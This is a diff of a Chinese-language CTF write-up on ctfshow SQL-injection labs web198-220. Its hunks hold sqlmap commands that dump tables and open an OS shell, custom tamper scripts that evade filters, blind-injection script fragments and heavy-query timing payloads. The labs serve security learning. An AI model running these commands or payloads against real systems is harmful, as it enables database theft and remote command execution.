@@ -2,18 +2,35 @@
 title: "ctfshow Web入门[SQL注入] web198-220 Writeup"
 date: 2022-07-29T14:23:23+08:00
 draft: false
-tags: ['sqli','ctf']
-categories: ['web']
 author: "X1r0z"
 
-# weight: 1  # Top page
+tags: ['sqli','ctf']
+categories: ['web']
 
-# You can also close(false) or open(true) something for this content.
-# P.S. comment can only be closed
-comment: false
-toc: false
-autoCollapseToc: false
+hiddenFromHomePage: false
+hiddenFromSearch: false
+twemoji: false
+lightgallery: true
+ruby: true
+fraction: true
+fontawesome: true
+linkToMarkdown: true
+rssFullText: false
+
+toc:
+  enable: true
+  auto: true
+code:
+  copy: true
+  maxShownLines: 50
+math:
+  enable: false
+share:
+  enable: true
+comment:
+  enable: true
 ---
+
 
 肝不动了... 盲注挺费时间的
 
@@ -72,7 +89,7 @@ autoCollapseToc: false
 
 指定 user-agent 和 referer
 
-```
+```bash
 sqlmap.py -u "http://abb99e06-4b83-46b4-85b6-aec02eb9fdda.challenge.ctf.show/api/?id=1" --user-agent "sqlmap" --referer "http://abb99e06-4b83-46b4-85b6-aec02eb9fdda.challenge.ctf.show/sqlmap.php" -t 20 --dump -T ctfshow_user -D ctfshow_web
 ```
 
@@ -80,7 +97,7 @@ sqlmap.py -u "http://abb99e06-4b83-46b4-85b6-aec02eb9fdda.challenge.ctf.show/api
 
 查询语句里写的是 get 请求, 但其实 post 请求也是可以的
 
-```
+```bash
 sqlmap.py -u "http://5cbfc211-2645-4415-b87b-39b535ba6e1a.challenge.ctf.show//api/" --data "id=1&page=1&limit=10" --user-agent "sqlmap" --referer "ctf.show" --dump -T ctfshow_user -D ctfshow_web 
 ```
 
@@ -94,7 +111,7 @@ method 试了一遍都不行, 看到 wp 才发现竟然是 PUT
    
 2.  /api/ 补全为 /api/index.php
 
-```
+```bash
 sqlmap.py -u "http://9f5fd319-561c-426e-a333-fe2eb2bf601a.challenge.ctf.show/api/index.php" --data "id=1&page=1&limit=10" --user-agent "sqlmap" --referer "ctf.show" --method PUT --headers "Content-Type: text/plain" --dump -T ctfshow_user -D ctfshow_web
 ```
 
@@ -104,7 +121,7 @@ sqlmap.py -u "http://9f5fd319-561c-426e-a333-fe2eb2bf601a.challenge.ctf.show/api
 
 其余同上 (竟然还是 PUT 方法...)
 
-```
+```bash
 sqlmap.py -u "http://ef292aba-c228-46fc-b3b0-52c98503672a.challenge.ctf.show/api/index.php" --data "id=1&page=1&limit=10" --user-agent "sqlmap" --referer "ctf.show" --method PUT --headers "Content-Type: text/plain" --cookie "PHPSESSID=41bio5n2atcltdt7dnsekcgmsk" --dump -T ctfshow_user -D ctfshow_web
 ```
 
@@ -116,7 +133,7 @@ sqlmap.py -u "http://ef292aba-c228-46fc-b3b0-52c98503672a.challenge.ctf.show/api
 
 可以使用 sqlmap 的 `--safe-*` 系列参数
 
-```
+```bash
     --safe-url=SAFEURL  URL address to visit frequently during testing
     --safe-post=SAFE..  POST data to send to a safe URL
     --safe-req=SAFER..  Load safe HTTP request from a file
@@ -125,7 +142,7 @@ sqlmap.py -u "http://ef292aba-c228-46fc-b3b0-52c98503672a.challenge.ctf.show/api
 
 freq 设置为1次
 
-```
+```bash
 sqlmap.py -u "http://e3eed01a-8ada-4f3c-bb92-7eeed1b78f2f.challenge.ctf.show/api/index.php" --data "id=1&page=1&limit=10" --user-agent "sqlmap" --referer "ctf.show" --method PUT --headers "Content-Type: text/plain" --safe-url "http://e3eed01a-8ada-4f3c-bb92-7eeed1b78f2f.challenge.ctf.show/api/getToken.php" --safe-freq 1 -dump -T ctfshow_flax -D ctfshow_web
 ```
 
@@ -133,7 +150,7 @@ sqlmap.py -u "http://e3eed01a-8ada-4f3c-bb92-7eeed1b78f2f.challenge.ctf.show/api
 
 同上
 
-```
+```bash
 sqlmap.py -u "http://7ce2ba54-4265-4985-966e-cf8db2093c86.challenge.ctf.show/api/index.php" --data "id=1&page=1&limit=10" --user-agent "sqlmap" --referer "ctf.show" --method PUT --headers "Content-Type: text/plain" --safe-url "http://7ce2ba54-4265-4985-966e-cf8db2093c86.challenge.ctf.show/api/getToken.php" --safe-freq 1 -dump -T ctfshow_flaxc -D ctfshow_web
 ```
 
@@ -141,7 +158,7 @@ sqlmap.py -u "http://7ce2ba54-4265-4985-966e-cf8db2093c86.challenge.ctf.show/api
 
 过滤了空格, 使用 tamper 中的 space2comment.py 绕过
 
-```
+```bash
 sqlmap.py -u "http://cfde58ec-6629-488a-ab99-aadff83d640c.challenge.ctf.show/api/index.php" --data "id=1&page=1&limit=10" --user-agent "sqlmap" --referer "ctf.show" --method PUT --headers "Content-Type: text/plain" --safe-url "http://cfde58ec-6629-488a-ab99-aadff83d640c.challenge.ctf.show/api/getToken.php" --safe-freq 1 --tamper "space2comment" --dump -T ctfshow_flaxca -D ctfshow_web
 ```
 
@@ -149,7 +166,7 @@ sqlmap.py -u "http://cfde58ec-6629-488a-ab99-aadff83d640c.challenge.ctf.show/api
 
 replace 一次 select, 本来想写 tamper 过滤的, 后来发现可能没有忽略大小写, sqlmap 自己直接就能跑
 
-```
+```bash
 sqlmap.py -u "http://873ccc03-e52a-4a9e-b820-5b1d09533ccc.challenge.ctf.show/api/index.php" --data "id=1&page=1&limit=10" --user-agent "sqlmap" --referer "ctf.show" --method PUT --headers "Content-Type: text/plain" --safe-url "http://873ccc03-e52a-4a9e-b820-5b1d09533ccc.challenge.ctf.show/api/getToken.php" --safe-freq 1 --tamper "space2comment" --dump -T ctfshow_flaxcac -D ctfshow_web --batch
 ```
 
@@ -161,7 +178,7 @@ sqlmap.py -u "http://873ccc03-e52a-4a9e-b820-5b1d09533ccc.challenge.ctf.show/api
 
 自写 tamper (测试自带的 equaltolike space2hash 等等都不行)
 
-```
+```python
 # Needed imports
 from lib.core.enums import PRIORITY
 
@@ -182,13 +199,13 @@ def tamper(payload, **kwargs):
     return retVal
 ```
 
-```
+```bash
 sqlmap.py -u "http://efe103d2-9fe4-463a-a8e5-38a00e2d73f2.challenge.ctf.show/api/index.php" --data "id=1" --user-agent "sqlmap" --referer "ctf.show" --method PUT --headers "Content-Type: text/plain" --safe-url "http://efe103d2-9fe4-463a-a8e5-38a00e2d73f2.challenge.ctf.show/api/getToken.php" --safe-freq 1 --tamper "my" --dump -T ctfshow_flav -D ctfshow_web
 ```
 
 ## web210
 
-```
+```php
 function decode($id){
     return strrev(base64_decode(strrev(base64_decode($id))));
   }
@@ -198,7 +215,7 @@ base64 + 反转字符串
 
 自写 tamper
 
-```
+```python
 # Needed imports
 import base64
 from lib.core.enums import PRIORITY
@@ -222,7 +239,7 @@ def tamper(payload, **kwargs):
 
 注意 base64 encode 之前需要 `.encode("utf-8")`, 最后 return 的时候 `.decode("utf-8")` (不能直接 `str()`)
 
-```
+```bash
 sqlmap.py -u "http://706317b6-ff03-45f2-ab3d-ac99e00c4f55.challenge.ctf.show/api/index.php" --data "id=1" --user-agent "sqlmap" --referer "ctf.show" --method PUT --headers "Content-Type: text/plain" --safe-url "http://706317b6-ff03-45f2-ab3d-ac99e00c4f55.challenge.ctf.show/api/getToken.php" --safe-freq 1 --tamper "my" --dump -T ctfshow_flavi -D ctfshow_web
 ```
 
@@ -242,7 +259,7 @@ tamper 同上, payload 改为 `payload.replace(" ", chr(0x0a))`
 
 os-shell
 
-```
+```bash
 sqlmap.py -u "http://b368fa62-6fe6-45ec-ad8c-7c8bf99218eb.challenge.ctf.show/api/index.php" --data "id=1" --user-agent "sqlmap" --referer "ctf.show" --method PUT --headers "Content-Type: text/plain" --safe-url "http://b368fa62-6fe6-45ec-ad8c-7c8bf99218eb.challenge.ctf.show/api/getToken.php" --safe-freq 1 --tamper "my" --os-shell
 ```
 
@@ -284,7 +301,7 @@ flag 在根目录
 
 盲注脚本
 
-```
+```python
 import time
 import requests
 
@@ -321,7 +338,7 @@ for i in range(64):
 
 其实用上面的 or 跑脚本也是一样的
 
-```
+```python
 import time
 import requests
 
@@ -386,13 +403,13 @@ payload 构造类似 web214, 但是过滤了 `sleep()`
 
 以下 payload 延时大约2秒
 
-```
+```sql
 SELECT count(*) FROM information_schema.tables A, mysql.user B, mysql.user C, mysql.user D, mysql.user E, mysql.user F
 ```
 
 以下 payload 延时约6秒
 
-```
+```sql
 SELECT count(*) FROM information_schema.columns A, information_schema.tables B, information_schema.tables C
 ```
 
@@ -402,7 +419,7 @@ SELECT count(*) FROM information_schema.columns A, information_schema.tables B, 
 
 ## web220
 
-```
+```php
 function waf($str){
     return preg_match('/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i',$str);
 }   
@@ -420,7 +437,7 @@ function waf($str){
 
 脚本
 
-```
+```python
 import time
 import requests
 
